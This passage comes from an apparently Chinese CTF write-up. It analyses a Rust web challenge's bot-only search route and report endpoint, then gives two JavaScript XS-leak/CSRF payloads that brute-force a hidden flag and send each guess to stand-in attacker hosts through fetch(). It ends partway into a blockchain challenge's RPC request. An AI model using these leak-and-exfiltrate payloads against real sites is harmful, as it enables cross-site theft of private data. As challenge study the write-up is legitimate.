+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nb>Ok</span><span class=p>(</span><span class=n>Json</span><span class=p>(</span><span class=n>comments</span><span class=p>))</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nb>Err</span><span class=p>(</span><span class=fm>anyhow!</span><span class=p>(</span><span class=s>&#34;No comments found&#34;</span><span class=p>).</span><span class=n>into</span><span class=p>())</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 这就是一个简单调用search查询数据的方法，再分析私有的搜索方法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-rust data-lang=rust><span class=line><span class=cl><span class=k>pub</span><span class=w> </span><span class=k>async</span><span class=w> </span><span class=k>fn</span> <span class=nf>private_search</span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Query</span><span class=p>(</span><span class=n>search</span><span class=p>)</span>: <span class=nc>Query</span><span class=o>&lt;</span><span class=n>Search</span><span class=o>&gt;</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>State</span><span class=p>(</span><span class=n>pool</span><span class=p>)</span>: <span class=nc>State</span><span class=o>&lt;</span><span class=n>Arc</span><span class=o>&lt;</span><span class=n>DbPool</span><span class=o>&gt;&gt;</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>ConnectInfo</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span>: <span class=nc>ConnectInfo</span><span class=o>&lt;</span><span class=n>SocketAddr</span><span class=o>&gt;</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>)</span><span class=w> </span>-&gt; <span class=nb>Result</span><span class=o>&lt;</span><span class=n>Json</span><span class=o>&lt;</span><span class=nb>Vec</span><span class=o>&lt;</span><span class=nb>String</span><span class=o>&gt;&gt;</span><span class=p>,</span><span class=w> </span><span class=n>AppError</span><span class=o>&gt;</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// 以下两个 if 与题目无关, 你只需要知道: private_search 路由仅有 bot 才能访问
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>bot_ip</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>tokio</span>::<span class=n>net</span>::<span class=n>lookup_host</span><span class=p>(</span><span class=s>&#34;bot:4444&#34;</span><span class=p>).</span><span class=k>await</span><span class=o>?</span><span class=p>.</span><span class=n>next</span><span class=p>().</span><span class=n>unwrap</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=n>addr</span><span class=p>.</span><span class=n>ip</span><span class=p>()</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>bot_ip</span><span class=p>.</span><span class=n>ip</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=nb>Err</span><span class=p>(</span><span class=fm>anyhow!</span><span class=p>(</span><span class=s>&#34;only bot can access&#34;</span><span class=p>).</span><span class=n>into</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>conn</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=n>get</span><span class=p>()</span><span class=o>?</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>comments</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>db</span>::<span class=n>search</span><span class=p>(</span><span class=n>conn</span><span class=p>,</span><span class=w> </span><span class=n>search</span><span class=p>.</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=kc>true</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=n>comments</span><span class=p>.</span><span class=n>len</span><span class=p>()</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nb>Ok</span><span class=p>(</span><span class=n>Json</span><span class=p>(</span><span class=n>comments</span><span class=p>))</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=nb>Err</span><span class=p>(</span><span class=fm>anyhow!</span><span class=p>(</span><span class=s>&#34;No comments found&#34;</span><span class=p>).</span><span class=n>into</span><span class=p>())</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 根据注释的描述，这个方法只能由本地的bot也就是<code>selenium</code>访问，其余的和公共的search方法是一样的，再分析report方法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-rust data-lang=rust><span class=line><span class=cl><span class=k>pub</span><span class=w> </span><span class=k>async</span><span class=w> </span><span class=k>fn</span> <span class=nf>report</span><span class=p>(</span><span class=n>Form</span><span class=p>(</span><span class=n>report</span><span class=p>)</span>: <span class=nc>Form</span><span class=o>&lt;</span><span class=n>Report</span><span class=o>&gt;</span><span class=p>)</span><span class=w> </span>-&gt; <span class=nc>Json</span><span class=o>&lt;</span><span class=n>Value</span><span class=o>&gt;</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>task</span>::<span class=n>spawn</span><span class=p>(</span><span class=k>async</span><span class=w> </span><span class=k>move</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=n>bot</span>::<span class=n>visit_url</span><span class=p>(</span><span class=n>report</span><span class=p>.</span><span class=n>url</span><span class=p>).</span><span class=k>await</span><span class=p>.</span><span class=n>unwrap</span><span class=p>()</span><span class=w> </span><span class=p>});</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Json</span><span class=p>(</span><span class=fm>json!</span><span class=p>({</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=s>&#34;message&#34;</span>: <span class=s>&#34;bot will visit the url soon&#34;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}))</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 可见这里访问的URL是可以指定的，所以这里是可以利用本地<code>selenium</code>去访问<code>/internal/search</code>这个路由获取到flag。最后我们分析一下search方法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-rust data-lang=rust><span class=line><span class=cl><span class=k>pub</span><span class=w> </span><span class=k>fn</span> <span class=nf>search</span><span class=p>(</span><span class=n>conn</span>: <span class=nc>DbConn</span><span class=p>,</span><span class=w> </span><span class=n>query</span>: <span class=nb>String</span><span class=p>,</span><span class=w> </span><span class=n>hidden</span>: <span class=kt>bool</span><span class=p>)</span><span class=w> </span>-&gt; <span class=nc>anyhow</span>::<span class=nb>Result</span><span class=o>&lt;</span><span class=nb>Vec</span><span class=o>&lt;</span><span class=nb>String</span><span class=o>&gt;&gt;</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=k>mut</span><span class=w> </span><span class=n>stmt</span><span class=w> </span><span class=o>=</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>conn</span><span class=p>.</span><span class=n>prepare</span><span class=p>(</span><span class=s>&#34;SELECT content FROM comments WHERE content LIKE ? AND hidden = ?&#34;</span><span class=p>)</span><span class=o>?</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>comments</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>stmt</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>.</span><span class=n>query_map</span><span class=p>(</span><span class=fm>params!</span><span class=p>[</span><span class=fm>format!</span><span class=p>(</span><span class=s>&#34;%</span><span class=si>{}</span><span class=s>%&#34;</span><span class=p>,</span><span class=w> </span><span class=n>query</span><span class=p>),</span><span class=w> </span><span class=n>hidden</span><span class=p>],</span><span class=w> </span><span class=o>|</span><span class=n>row</span><span class=o>|</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nb>Ok</span><span class=p>(</span><span class=n>row</span><span class=p>.</span><span class=n>get</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>?</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>})</span><span class=o>?</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>.</span><span class=n>collect</span>::<span class=o>&lt;</span><span class=n>rusqlite</span>::<span class=nb>Result</span><span class=o>&lt;</span><span class=nb>Vec</span><span class=o>&lt;</span><span class=nb>String</span><span class=o>&gt;&gt;&gt;</span><span class=p>()</span><span class=o>?</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nb>Ok</span><span class=p>(</span><span class=n>comments</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 这里我们分析准备的SQL语句，我们要查询flag那么hidden必须是true，仅有<code>/internal/search</code>可以获取到，所以我们的思路很明朗了就是利用本地的bot去访问对应的路由。但这里就有一个问题，就是bot访问的结果是不会返回给我们的，所以我们就需要通过XSleak去获取数据，大体流程如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>graph TD
+</span></span><span class=line><span class=cl>    A[通过 /report 路由创建访问任务] --&gt; B[Bot 访问攻击机]
+</span></span><span class=line><span class=cl>    B --&gt; C[攻击机利用 CSRF 访问 /internal/search 路由]
+</span></span><span class=line><span class=cl>    C --&gt; D{访问成功?}
+</span></span><span class=line><span class=cl>    D --&gt;|是| E[记录成功结果]
+</span></span><span class=line><span class=cl>    D --&gt;|否| F[记录不成功结果]
+</span></span><span class=line><span class=cl>    E --&gt; G[多次访问并区分数据包]
+</span></span><span class=line><span class=cl>    F --&gt; G
+</span></span><span class=line><span class=cl>    G --&gt; H[爆破出 Flag]
+</span></span></code></pre></td></tr></table></div></div><p>​</p><p>​ 思路并不难，但是我卡在了区分成功包和失败包，我已经实验过，可以利用bot来访问攻击机，利用JS外带数据。我最后的脚本是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>//var chars = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&#34;#$%&amp;\&#39;()*+,-./:;&lt;=&gt;?@[\\]^`{|}~ &#39;;
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>var</span> <span class=nx>chars</span> <span class=o>=</span> <span class=s1>&#39;ha&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>charLen</span> <span class=o>=</span> <span class=nx>chars</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>ENDPOINT</span> <span class=o>=</span> <span class=s2>&#34;http://aim-ip:8000/search?s=&#34;</span>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>x</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;iframe&#39;</span><span class=p>);</span>   
+</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>search</span><span class=p>(</span><span class=nx>leak</span><span class=p>,</span> <span class=nx>charCounter</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>curChar</span> <span class=o>=</span> <span class=nx>chars</span><span class=p>[</span><span class=nx>charCounter</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=c1>//Chek if the character is valid
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>x</span><span class=p>.</span><span class=nx>setAttribute</span><span class=p>(</span><span class=s2>&#34;src&#34;</span><span class=p>,</span> <span class=s1>&#39;http://aim-ip:8000/search?s=&#39;</span> <span class=o>+</span> <span class=nx>leak</span> <span class=o>+</span> <span class=nx>curChar</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>x</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>leak</span> <span class=o>+=</span> <span class=nx>curChar</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>iframecount</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementsByTagName</span><span class=p>(</span><span class=s1>&#39;iframe&#39;</span><span class=p>).</span><span class=nx>length</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>iframecount</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=c1>//When the page inside the iframe is loaded
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>x</span><span class=p>.</span><span class=nx>onload</span> <span class=o>=</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=c1>//检查页面中有多少个 iframe，如果有1个或多个，则说明当前枚举的字符是有效的。
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=nx>iframecount</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;http://attack-ip/recorder.php?leak=&#39;</span> <span class=o>+</span> <span class=nx>escape</span><span class=p>(</span><span class=nx>leak</span><span class=p>),</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=nx>method</span><span class=o>:</span> <span class=s2>&#34;GET&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=nx>mode</span><span class=o>:</span> <span class=s2>&#34;no-cors&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=nx>credentials</span><span class=o>:</span> <span class=s2>&#34;include&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>});</span>
+</span></span><span class=line><span class=cl>            <span class=nx>leak</span> <span class=o>+=</span> <span class=nx>curChar</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=c1>//search(leak, (charCounter + 1) % chars.length);
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nx>x</span><span class=p>.</span><span class=nx>onerror</span> <span class=o>=</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;http://attack-ip/recorder.php?leak=error&#39;</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=nx>method</span><span class=o>:</span> <span class=s2>&#34;GET&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=nx>mode</span><span class=o>:</span> <span class=s2>&#34;no-cors&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=nx>credentials</span><span class=o>:</span> <span class=s2>&#34;include&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>});</span>
+</span></span><span class=line><span class=cl>        <span class=c1>//search(leak, (charCounter + 1) % chars.length);
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>exploit</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>charLen</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>search</span><span class=p>(</span><span class=s2>&#34;T&#34;</span><span class=p>,</span> <span class=nx>i</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nx>exploit</span><span class=p>();</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 这个JS已经能够实现利用CSRF远程访问目标机了，但是不能正确区分正确包和错误包。</p><h4 id=后续>后续：</h4><p>​ 根据提供的WP，我改造了一下，得到了下面的payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// 修改后的异步版本
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>let</span> <span class=nx>flag</span> <span class=o>=</span> <span class=s1>&#39;nctf{&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span> <span class=nx>checkError</span><span class=p>(</span><span class=nx>currentFlag</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>((</span><span class=nx>resolve</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>url</span> <span class=o>=</span> <span class=sb>`http://127.0.0.1:8000/internal/search?s=</span><span class=si>${</span><span class=nx>currentFlag</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>script</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;script&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>script</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=nx>url</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>script</span><span class=p>.</span><span class=nx>onload</span> <span class=o>=</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nx>fetch</span><span class=p>(</span><span class=sb>`http://yourwebhook/recorder.php?leak=</span><span class=si>${</span><span class=nx>currentFlag</span><span class=si>}</span><span class=sb>`</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=p>.</span><span class=k>finally</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=nx>resolve</span><span class=p>());</span> <span class=c1>// 确保请求完成才继续
+</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=nx>flag</span> <span class=o>=</span> <span class=nx>currentFlag</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>};</span>
+</span></span><span class=line><span class=cl>    <span class=nx>script</span><span class=p>.</span><span class=nx>onerror</span> <span class=o>=</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=nx>resolve</span><span class=p>();</span> <span class=c1>// 错误时也继续流程
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nb>document</span><span class=p>.</span><span class=nx>head</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>script</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>});</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=kr>async</span> <span class=kd>function</span> <span class=nx>bruteForce</span><span class=p>(</span><span class=nx>curdepth</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=nx>curdepth</span> <span class=o>==</span> <span class=mi>30</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>charset</span> <span class=o>=</span> <span class=s1>&#39;abcdefghijklmnopqrstuvwxyz0123456789-}&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=kr>const</span> <span class=nx>c</span> <span class=k>of</span> <span class=nx>charset</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>newFlag</span> <span class=o>=</span> <span class=nx>flag</span> <span class=o>+</span> <span class=nx>c</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=nx>checkError</span><span class=p>(</span><span class=nx>newFlag</span><span class=p>);</span> <span class=c1>// 等待当前请求完成
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=nx>bruteForce</span><span class=p>(</span><span class=nx>curdepth</span><span class=o>+</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=c1>// 执行爆破
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>bruteForce</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=x1guessgame>x1guessgame</h2><p>​ 这道题是区块链的题目，我的思路只能得到hash过后的answer，所以也卡住了。</p><p>​ 请求包：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/rpc</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>39.106.16.204:18144</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
+</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 这里我只列出数据包：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;jsonrpc&#34;</span><span class=p>:</span> <span class=s2>&#34;2.0&#34;</span><span class=p>,</span><span class=nt>&#34;method&#34;</span><span class=p>:</span> <span class=s2>&#34;eth_getStorageAt&#34;</span><span class=p>,</span><span class=nt>&#34;params&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;0x交易hash值&#34;</span><span class=p>,</span><span class=s2>&#34;0x0&#34;</span><span class=p>,</span><span class=s2>&#34;latest&#34;</span><span class=p>],</span><span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=mi>1</span><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>​ 获取处理结果，提交answer的数据包：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
